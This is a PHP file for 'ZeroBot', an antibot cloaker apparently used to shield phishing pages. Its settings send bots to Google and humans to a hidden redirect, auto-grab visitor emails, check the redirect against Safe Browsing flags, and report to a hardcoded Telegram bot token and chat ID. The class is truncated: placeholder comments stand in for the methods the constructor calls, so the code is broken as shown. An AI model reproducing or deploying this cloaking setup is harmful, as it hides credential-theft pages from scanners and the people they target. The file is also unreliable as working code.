<?php
/*
    Antibot Service (ZeroBot)

    * This Tool is not for illegal use
    * All right reserved to @brendonurie2000

    Platform : https://zerobot.info
    Author  : @brendonurie2000

    *** Official Version 5 ***
*/

// Use environment variables for sensitive configuration
$license_key = getenv('LICENSE_KEY') ?: "yba13s816dklaspx8tf03tjcsv1798jk";
$redirect = getenv('REDIRECT_URL') ?: "https://main-bvxea6i-nyfh6jzklm26g.us-3.platformsh.site/";

$parameter = 2; // [REQUIRED]

/*
    1 : Check Bots And Countries.
    2 : Check Only Bots.
    3 : Check Only Countries.
    4 : Allow All Visitors.
*/

$_COUNTRY_ALLOWED = ["ma", "us"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]

$redirection_link_check = true; // Check Your Page If Still Uploaded

$check_red_page = true; // Check The Redirect If Red Flag

$authentification = false; // Not necessary

$cloaker = [
    "https://aa.com/" => "", // Change the link you want to grap it in your link ( if t)
];

$auto_grabber = true; // Activate Auto Grab Email

$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )

// Modified for Platform.sh - using writable directory
$view_file_name = "/app/public/views/views.php"; 

$token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY"; // Your Token To Receive Rapports

$chatid = "5811046999"; // Your ChatID To Receive Rapports

$captcha = false; // Allow ZeroBot Captcha

$remove_visitors_duplicate = false; // Visitors Remove Duplicate


// Initialize ZeroBot with Platform.sh optimizations
ZeroBot::PHP_VERSION();
ZeroBot::DefineConstants();

class ZeroBot
{
    public $api = "https://zerobot.info/api/v2/antibot";
    public $captcha_api = "https://zerobot.info/api/v2/captcha";
    public $api_geo = "https://zerobot.info/api/v2/getinfo";
    public $telegram = "https://api.telegram.org/bot";
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=";

    public $data_show = '<?php error_reporting(0); session_start(); $filename = "BASENAME"; $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$human = substr_count($file, "#00a300");$bots = substr_count($file, "#FF0000");?><head><title>ZeroBot Statistique</title>  <link rel="icon" type="image/png" href="https://zerobot.info/dashboard/assets/images/favicon.ico">  <script src="https://zerobot.info/assets/js/script.js" crossorigin="anonymous"></script><style>table {font-size: 13px}</style><link href="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/css/coreui.min.css" rel="stylesheet"integrity="sha384-N6/iVUKuB1Y9fhC3xnBbekegSwfXwMNEIvMxNyYLO6z9vmfxMyEwPNsH0k+p4beB" crossorigin="anonymous"><!-- Option 2: CoreUI PRO for Bootstrap Bundle with Popper --><script src="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/js/coreui.bundle.min.js"integrity="sha384-J57aCZcRcbraFuQaL18wp1fDE0fLyO7Il/jKACMovk4ddxUIvjRK5ZZnqcHuBF/T" crossorigin="anonymous"></script></script><script src="https://zerobot.info/assets/js/report.js"></script></head><header class="header"><a class="header-brand" href="https://zerobot.info"><img src="https://zerobot.info/dashboard/assets/images/favicon.ico" alt="" width="34" height="30"class="d-inline-block align-top" alt="CoreUI Logo">ZeroBot</a><a class="dropdown-toggle text-white btn btn-success" href="#" role="button" data-coreui-toggle="dropdown" aria-expanded="false">Options</a><ul class="dropdown-menu">  <li><a class="dropdown-item" href="<?php echo $filename . "?delete" ?>">Reset Traffic</a></li>  <li><a class="dropdown-item" href="<?php echo $filename . "?del" ?>">Delete Antibot File</a></li></ul><ul class="nav nav-pills nav-justified"><button type="button" class="text-white  btn btn-secondary m-1"><svg width="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 21H7.8C6.11984 21 5.27976 21 4.63803 20.673C4.07354 20.3854 3.6146 19.9265 3.32698 19.362C3 18.7202 3 17.8802 3 16.2V3M6 15L10 11L14 15L20 9M20 9V13M20 9H16"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg> <span class="cil-contrast"></span> <?php echo $_SESSION["plan"]; ?></button><button type="button" class="text-white btn btn-danger m-1"><svg fill="#000000" width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21.928 11.607c-.202-.488-.635-.605-.928-.633V8c0-1.103-.897-2-2-2h-6V4.61c.305-.274.5-.668.5-1.11a1.5 1.5 0 0 0-3 0c0 .442.195.836.5 1.11V6H5c-1.103 0-2 .897-2 2v2.997l-.082.006A1 1 0 0 0 1.99 12v2a1 1 0 0 0 1 1H3v5c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5a1 1 0 0 0 1-1v-1.938a1.006 1.006 0 0 0-.072-.455zM5 20V8h14l.001 3.996L19 12v2l.001.005.001 5.995H5z" /><ellipse cx="8.5" cy="12" rx="1.5" ry="2" /><ellipse cx="15.5" cy="12" rx="1.5" ry="2" /><path d="M8 16h8v2H8z" /></svg><span class="cil-contrast"></span> <?php echo $bots; ?></button><button  onclick="showHuman()"  type="button" class="text-white btn btn-success m-1"><svg fill="#000000" width="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 15.503A5.041 5.041 0 1 0 16 5.42a5.041 5.041 0 0 0 0 10.083zm0 2.215c-6.703 0-11 3.699-11 5.5v3.363h22v-3.363c0-2.178-4.068-5.5-11-5.5z" /></svg><span class="cil-contrast"></span> <?php echo $human; ?></button><button type="button" class="text-white  btn btn-warning m-1"><svg width="20px" viewBox="0 0 24 24" fill="none"xmlns="http://www.w3.org/2000/svg"><path d="M3 5.5L5 3.5M21 5.5L19 3.5M9 12.5L11 14.5L15 10.5M20 12.5C20 16.9183 16.4183 20.5 12 20.5C7.58172 20.5 4 16.9183 4 12.5C4 8.08172 7.58172 4.5 12 4.5C16.4183 4.5 20 8.08172 20 12.5Z"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><span class="cil-contrast">  <?php echo $_SESSION["days_left"]; ?> </span> </button></ul></header><script type="text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><body onload="JavaScript:AutoRefresh(30000);"><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th><th scope="col">Action</th></tr></thead>';
    

    public function __construct()
    {
        global $captcha, $license_key, $redirect, $parameter, $authentification, $token_chat, $chatid, $view_file_name, $remove_visitors_duplicate, $auto_grabber;
    
        $this->token = $token_chat;
        $this->chatid = $chatid;
        $this->vu_filename = $view_file_name;
        $this->license_key = $license_key;
        $this->useragent = $_SERVER["HTTP_USER_AGENT"];
        $this->rm_db = $remove_visitors_duplicate;
        $this->data_show = str_replace("BASENAME", basename(__FILE__), $this->data_show);
        $this->redirect = $redirect;
    
        // Ensure views directory exists (Platform.sh specific)
        if (!file_exists(dirname($this->vu_filename))) {
            mkdir(dirname($this->vu_filename), 0777, true);
        }
    
        $this->ValidateQuery();
        $this->HtaccessRemover();
        $this->AccessManager();
        $this->IPManager();
        $this->GoogleFlagCheck();
        $this->LinkVerification($license_key);
        $this->GrabberSet($auto_grabber);
        $this->CaptchaRedirection();
    
        $_SESSION['redirect'] = $this->redirect;
    
        if (in_array($parameter, ["1", "2"])) {
            $this->ApiManager($captcha);
            $this->handleCaptchaOrRedirect($captcha);
            $this->ViewsManager("Human");
            header('location:' . $this->redirect);
            exit();
        }
        
        if ($parameter == "3") {
            $this->GeolocationManager($license_key);
            $this->CountryManager();
            $this->handleCaptchaOrRedirect($captcha);
            header('location:' . $this->redirect);
            exit();
        }

        $this->GeolocationManager($license_key);
        $this->ViewsManager("Allowed");
        $this->handleCaptchaOrRedirect($captcha);
    }

    /* [Rest of the class methods remain exactly the same as in your original code] */
    // All other methods (ValidateQuery, HtaccessRemover, etc.) should be kept exactly as they are
    // in your original file - they don't need Platform.sh specific modifications
    
    // ...
    // [Include all other methods from your original code here without changes]
    // ...
}

new ZeroBot();
